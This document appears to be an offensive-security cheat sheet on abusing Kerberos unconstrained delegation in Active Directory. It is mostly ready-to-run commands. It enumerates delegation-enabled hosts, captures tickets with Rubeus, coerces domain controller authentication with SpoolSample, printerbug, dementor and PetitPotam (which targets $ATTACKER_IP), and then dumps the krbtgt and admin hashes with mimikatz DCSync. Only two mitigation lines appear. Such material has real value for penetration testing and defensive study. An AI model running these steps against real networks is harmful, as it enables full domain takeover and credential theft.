# Kerberos Delegation - Unconstrained Delegation

> The user sends a ST to access the service, along with their TGT, and then the service can use the user's TGT to request a ST for the user to any other service and impersonate the user.
> When a user authenticates to a computer that has unrestricted kerberos delegation privilege turned on, authenticated user's TGT ticket gets saved to that computer's memory.

:warning: Unconstrained delegation used to be the only option available in Windows 2000

> **Warning**
> Remember to coerce to a HOSTNAME if you want a Kerberos Ticket

The goal is to gain DC Sync privileges using a computer account and the SpoolService bug.

**Requirements**:

- Object with Property **Trust this computer for delegation to any service (Kerberos only)**
- Must have **ADS_UF_TRUSTED_FOR_DELEGATION**
- Must not have **ADS_UF_NOT_DELEGATED** flag
- User must not be in the **Protected Users** group
- User must not have the flag **Account is sensitive and cannot be delegated**

## Find delegation

:warning: : Domain controllers usually have unconstrained delegation enabled.
Check the `TRUSTED_FOR_DELEGATION` property.

- [ADModule](https://github.com/samratashok/ADModule)

  ```powershell
  # From https://github.com/samratashok/ADModule
  PS> Get-ADComputer -Filter {TrustedForDelegation -eq $True}
  ```

- [bloodyAD](https://github.com/CravateRouge/bloodyAD)

  ```ps1
  bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(objectCategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))' --attr sAMAccountName,userAccountControl
  ```
  
- [ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump)

  ```powershell
  $> ldapdomaindump -u "DOMAIN\\Account" -p "Password123*" 10.10.10.10   
  grep TRUSTED_FOR_DELEGATION domain_computers.grep
  ```

- [netexec module](https://github.com/Pennyw0rth/NetExec/wiki)

  ```powershell
  nxc ldap 10.10.10.10 -u username -p password --trusted-for-delegation
  ```

- BloodHound: `MATCH (c:Computer {unconstraineddelegation:true}) RETURN c`
- Powershell Active Directory module: `Get-ADComputer -LDAPFilter "(&(objectCategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" -Properties DNSHostName,userAccountControl`

## Kerberoasting Unconstrained Delegation 

* **Rubeus**                                                                                                                                                          
  Monitor for New TGT's                                                                                                                                               
  ```powershell                                                                                                                                                       
  .\Rubeus.exe monitor /interval:5 /nowrap                                                                                                                            
  ```                                                                                                                                                                 
  Use the recieved ticket to access a resource                                                                                                                        
  ```powershell                                                                                                                                                       
  .\Rubeus.exe asktgs /ticket:<Recieved Ticket> /service:<SPN> /ptt /nowrap                                                                                                   
  ```                                                                                                                                                                 
  If the above doesn't work, we use renew to get a brand new TGT instead of a TGS
  ```powershell
  .\Rubeus.exe renew /ticket:<ticket> /ptt                                                                                                                            
  ```

## The Printer Bug (exploit w/ [SpoolSample POC](https://github.com/leechristensen/SpoolSample) & Rubeus

> There is a bug in the Print System Remote protocol that can force a computer to authenticate to any computer in the domain, thus allowing us to capture the machine TGT

* **We can use the [SpoolSample POC](https://github.com/leechristensen/SpoolSample) to accomplish this**

### Execution
  Note: 2 computers, sql01 & DC01
  From SQL01:
  ```powershell
  .\Rubeus.exe monitor /interval:5 /nowrap
  ```
  Open another PS windowson SQL01
  ```powershell
  #Syntax
  .\SpoolSample.exe <TargetServer> <CaptureServer>
  # Example
  .\SpoolSample.exe dc01.inlanefreight.local sql01.inlanefreight.local
  # This should force DC01 to auth to SQL01 thus giving us the TGT of the DC
  ```
  Renew the captured TGT w/ Rubeus
  ```powershell
  .\Rubeus.exe renew /ticket:<ticket> /ptt
  ```
  If we manage to capture the tgt, we can perform a DCSync and pwn the domain

Example
  Dumping an admin user w/ mimikatz
  ```powershell
  mimikatz.exe
  mimikatz > lsadump::dcsync /user:<Admin Username>
  ```
  Rubeus to request a ticket as that admin user
  ```powershell
  .\Rubeus.exe asktgt /rc4:<NTLM hash> /user:<admin username> /ptt
  ```
  We can now use this ticket to impersonate the administrative user.

## SpoolService Abuse with Unconstrained Delegation Using SpoolSample, krbrelayx, & dementor

### SpoolService status

Check if the spool service is running on the remote host

```powershell
ls \\dc01\pipe\spoolss
python rpcdump.py DOMAIN/user:password@10.10.10.10
```

### Monitor with Rubeus

Monitor incoming connections from Rubeus.

```powershell
.\Rubeus.exe monitor /interval:5 /nowrap
```

### Force a connect back from the DC

Due to the unconstrained delegation, the TGT of the computer account (DC$) will be saved in the memory of the computer with unconstrained delegation. By default the domain controller computer account has DCSync rights over the domain object.

> [SpoolSample PoC](https://github.com/leechristensen/SpoolSample) is a PoC to coerce a Windows host to authenticate to an arbitrary server using a "feature" in the MS-RPRN RPC interface.

```powershell
.\SpoolSample.exe VICTIM-DC-NAME UNCONSTRAINED-SERVER-DC-NAME
.\SpoolSample.exe DC01.HACKER.LAB HELPDESK.HACKER.LAB
# DC01.HACKER.LAB is the domain controller we want to compromise
# HELPDESK.HACKER.LAB is the machine with delegation enabled that we control.

### krbrelayx
# From https://github.com/dirkjanm/krbrelayx
printerbug.py 'domain/username:password'@<VICTIM-DC-NAME> <UNCONSTRAINED-SERVER-DC-NAME>

# From https://gist.github.com/3xocyte/cfaf8a34f76569a8251bde65fe69dccc#gistcomment-2773689
python dementor.py -d domain -u username -p password <UNCONSTRAINED-SERVER-DC-NAME> <VICTIM-DC-NAME>
```

If the attack worked you should get a TGT of the domain controller.

### Load the ticket

Extract the base64 TGT from Rubeus output and load it to our current session.

```powershell
.\Rubeus.exe asktgs /ticket:<ticket base64> /service:LDAP/dc.lab.local,cifs/dc.lab.local /ptt
```

Alternatively you could also grab the ticket using Mimikatz :  `mimikatz # sekurlsa::tickets`

Then you can use DCsync or another attack : `mimikatz # lsadump::dcsync /user:HACKER\krbtgt`

## S4U2self for Non-Domain Controllers
> Using the credentials above, if we don't need to do a DCSync, or if the target computer is not a DC, we can use S4U2self to impersonate any user in the domain. This is useful for scenarios where we have a ticket from a computer that is not a domain controller

Forge a service ticket for any service                                                                                                                              
  ```powershell                                                                                                                                                       
  .\Rubeus.exe s4u /self /nowrap /impersonateuser:<User to impersonate> /altservice:<SPN> /ptt /ticker:<ticket>                                                       
  ```

### Mitigation

- Ensure sensitive accounts cannot be delegated
- Disable the Print Spooler Service

## MS-EFSRPC Abuse with Unconstrained Delegation

Using `PetitPotam`, another tool to coerce a callback from the targeted machine, instead of `SpoolSample`.

```bash
# Coerce the callback
git clone https://github.com/topotam/PetitPotam
python3 petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP
python3 petitpotam.py -d '' -u '' -p '' $ATTACKER_IP $TARGET_IP

# Extract the ticket
.\Rubeus.exe asktgs /ticket:<ticket base64> /ptt
```

## References

- [Exploiting Unconstrained Delegation - Riccardo Ancarani - 28 APRIL 2019](https://www.riccardoancarani.it/exploiting-unconstrained-delegation/)
- [Hunting in Active Directory: Unconstrained Delegation & Forests Trusts - Roberto Rodriguez - Nov 28, 2018](https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1)
- [Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory - Elad Shamir - 28 January 2019](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
